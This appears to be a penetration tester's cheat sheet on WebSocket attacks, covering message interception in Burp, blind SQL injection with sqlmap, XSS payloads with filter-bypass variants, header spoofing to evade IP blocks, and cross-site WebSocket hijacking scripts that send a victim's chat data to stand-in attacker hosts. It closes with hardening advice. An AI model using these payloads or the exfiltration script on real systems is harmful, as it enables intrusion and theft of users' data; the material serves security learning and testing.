# WebSocket

WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

{% code overflow="wrap" fullWidth="true" %}
```sh
https://exploit-notes.hdks.org/exploit/web/websocket-pentesting/#cross-site-websocket-hijacking
# Blind SQLi
12 or substring(version(),1,1)=8
# and check WebSockets history on Burp. Note there the URL and modify target , adapt the script by intercepting Burp Websocket request (modify ws://$IP/$PATH and the parameter which might not be id); then
sqlmap -u ... --dbs # do not use batch, try to reduce the requests manually or the service might crash
# Alternative: 
sqlmap -u "ws://..." --data "{'id':...}" --level 5 --risk 3 --batch --threads 10 # Threads are safe to do in a boolean injection, not for time-based injections
```
{% endcode %}

## Manipulating WebSocket traffic

{% code overflow="wrap" fullWidth="true" %}
```sh
You can use Burp Suite to: 
    •  Intercept and modify WebSocket messages.
    •  Replay and generate new WebSocket messages.
    •  Manipulate WebSocket connections.

######################### Intercepting and modifying WebSocket messages
    • Open Burp browser.    
    • Browse to the application function that uses WebSockets. You can determine that WebSockets are being used 
    by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.    
    • In the Intercept tab of Burp Proxy, ensure that interception is turned on.    
    • When a WebSocket message is sent from the browser or server, it will be displayed in the Intercept tab.
    
######################### Replaying and generating new WebSocket messages
    • Burp Proxy, select a message in the WebSockets history, or in the Intercept tab, and choose "Send to Repeater".
    • In Burp Repeater, you can now edit the message that was selected, and send it over and over.    
    • You can enter a new message and send it in either direction, to the client or server.    
    • In the "History" panel within Burp Repeater, you can view the history of messages that have been transmitted.
    • If you want to edit and resend any message in the history panel > select message > "Edit and resend"

########################## Manipulating WebSocket connections
 There are various situations in which manipulating the WebSocket handshake might be necessary:
    • It can enable you to reach more attack surface.
    • Some attacks might cause your connection to drop so you need to establish a new one.
    • Tokens or other data in the original handshake request might be stale and need updating.
You can manipulate the WebSocket handshake using Burp Repeater:
    • Send a WebSocket message to Burp Repeater as already described.
    • In Burp Repeater > pencil icon next to the WebSocket URL. This opens a wizard that lets you 
    attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.
    • If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show
    full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.
    • When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. 
    If a new WebSocket connection was successfully established, you can then use this to send new messages in Repeater.
```
{% endcode %}

## WebSockets security vulnerabilities

Practically any web security vulnerability might arise in relation to WebSockets:

• SQLi, XXE, blind vulns detectable by OAST techniques, XSS, other client-side vulns...

## Manipulating WebSocket messages to exploit vulnerabilities

{% code overflow="wrap" fullWidth="true" %}
```sh
# suppose a chat application uses WebSockets to send chat messages between the browser and the server
{"message":"Hello Carlos"}
# Message is transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows: 
<td>Hello Carlos</td>
# an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message: 
{"message":"<img src=1 onerror='alert(1)'>"}
```
{% endcode %}

## Manipulating the WebSocket handshake to exploit vulnerabilities

• Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.

• Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.

• Attack surface introduced by custom HTTP headers used by the application.

```sh
# EXAMPLE: Manipulating the WebSocket handshake to exploit vulnerabilities
X-Forwarded-For: 127.0.0.20 # in case IP gets blacklisted
# To bypass XSS protections:
{"message":"<img src=1 oNeRrOr=alert`1`>"}
{"message":"<iframe src='jAvAsCripT:alert`1`'></iframe>"}
```

## Using cross-site WebSockets to exploit vulnerabilities

Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls. This is known as a cross-site WebSocket hijacking attack, and it involves exploiting CSRF on a WebSocket handshake.

### What is cross-site WebSocket hijacking?

Cross-site WebSocket hijacking involves a CSRF on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

### What is the impact of cross-site WebSocket hijacking?

* **Perform unauthorized actions masquerading as the victim user.**
* **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

### Performing a cross-site WebSocket hijacking attack

{% code overflow="wrap" fullWidth="true" %}
```sh
https://gist.github.com/Shapa7276/adfec9bbfcd71bef73c2ec234df9837d

- Review the WebSocket handshakes that the app carries out and determine whether they are protected against CSRF. 
- Find a handshake message that relies solely on HTTP cookies for session handling and does not employ tokens
or other unpredictable values in request parameters. 
# The following WebSocket handshake request is probably vulnerable to CSRF -> only session token transmitted in cookie
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
# NOTE: The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, 
# and is not used for authentication or session handling purposes. 

 The attack might involve:
    Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
    Sending WebSocket messages to retrieve sensitive data.
    Sometimes, just waiting for incoming messages to arrive containing sensitive data.

# EXAMPLE: Cross-site WebSocket hijacking (CSWH)
- Check the chat shows all the chat history every time, there is a cookie for that w/ SameSite=None
- Check WebSockets history to see it sends a "READY" message to retrieve chat history
<script>
    var ws = new WebSocket('wss://your-websocket-url/endpoint');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) { 
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
<script>
    var ws = new WebSocket('wss://your-websocket-url/endpoint');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) { 
        fetch('https://exploit-server.net/message?' + event.data);
    };
</script>
# Another option is btoa(event.data) to get base64 encoding of that data
```
{% endcode %}

## How to secure a WebSocket connection

* Use the `wss://` protocol (WebSockets over TLS).
* Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
* Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
* Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities (SQL, XSS...).
